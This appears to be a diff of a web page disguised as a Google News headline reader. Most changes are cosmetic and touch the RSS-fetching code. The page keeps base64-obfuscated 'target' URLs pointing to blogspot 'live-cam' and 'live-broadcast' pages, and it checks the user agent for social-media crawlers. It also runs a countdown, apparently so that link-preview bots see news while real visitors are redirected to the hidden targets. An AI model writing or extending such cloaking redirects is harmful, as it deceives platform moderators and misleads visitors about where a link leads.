@@ -47,10 +47,12 @@
       border-radius: 8px;
       border-left: 4px solid #4285f4;
     }
-    .news-title {
-      font-size: 1rem;
-      margin-bottom: 5px;
-      line-height: 1.4;
+    .news-title a {
+      text-decoration: none;
+      color: #333;
+    }
+    .news-title a:hover {
+      color: #1a73e8;
     }
     .news-meta {
       font-size: 0.8rem;
@@ -84,7 +86,6 @@
   </div>
 
   <script>
-    // 🎯 DOMAIN THẬT
     const ENCRYPTED_TARGETS = [
       'aHR0cHM6Ly9iaW5hNTIweC5ibG9nc3BvdC5jb20vcC9saXZlLWJyb2FkY2FzdC5odG1s',
       'aHR0cHM6Ly9iaW5hNTIweC5ibG9nc3BvdC5jb20vcC9saXZlLWNhbS5odG1s'
@@ -110,26 +111,29 @@
       return /facebookexternalhit|Facebot|Twitterbot|LinkedInBot/i.test(navigator.userAgent);
     }
 
-    
+    // 📰 LẤY TIN TỪ GOOGLE RSS (qua proxy tránh lỗi CORS)
     async function loadSimpleNews() {
       const container = document.getElementById('news-container');
-      const rssURL = 'https://news.google.com/rss?hl=en-US&gl=US&ceid=US:en';
+      const rssURL = 'https://news.google.com/rss?hl=en-US&gl=US';
+      const proxyURL = `https://api.allorigins.win/get?url=${encodeURIComponent(rssURL)}`;
+      
       try {
-        const res = await fetch(`https://api.allorigins.win/get?url=${encodeURIComponent(rssURL)}`);
+        const res = await fetch(proxyURL);
         const data = await res.json();
         const parser = new DOMParser();
-        const xml = parser.parseFromString(data.contents, "text/xml");
+        const xml = parser.parseFromString(data.contents, "application/xml");
         const items = xml.querySelectorAll("item");
-        
+        if (!items.length) throw new Error("No items found in RSS");
+
         let newsHTML = '';
         items.forEach((item, index) => {
-          if (index >= 8) return; 
-          const title = item.querySelector("title")?.textContent || "No title";
+          if (index >= 8) return; // Giới hạn 8 tin
+          const title = item.querySelector("title")?.textContent || "Untitled";
           const link = item.querySelector("link")?.textContent || "#";
           const pubDate = new Date(item.querySelector("pubDate")?.textContent || "").toLocaleDateString();
           newsHTML += `
             <div class="news-item">
-              <div class="news-title"><a href="${link}" target="_blank" style="text-decoration:none;color:#333;">${title}</a></div>
+              <div class="news-title"><a href="${link}" target="_blank">${title}</a></div>
               <div class="news-meta">
                 <span>Google News</span>
                 <span>${pubDate}</span>
@@ -138,10 +142,10 @@
           `;
         });
 
-        container.innerHTML = newsHTML || '<div class="loading">No news available.</div>';
-      } catch (e) {
-        console.error("Error loading RSS:", e);
-        container.innerHTML = '<div class="loading">Unable to load news.</div>';
+        container.innerHTML = newsHTML;
+      } catch (err) {
+        console.error("RSS load error:", err);
+        container.innerHTML = '<div class="loading">⚠️ Unable to load news. Please try again later.</div>';
       }
     }
 
@@ -155,7 +159,7 @@
         return;
       }
 
-      let seconds = 20;
+      let seconds = 27;
       const countdownEl = document.getElementById('countdown');
       const timer = setInterval(() => {
         seconds--;
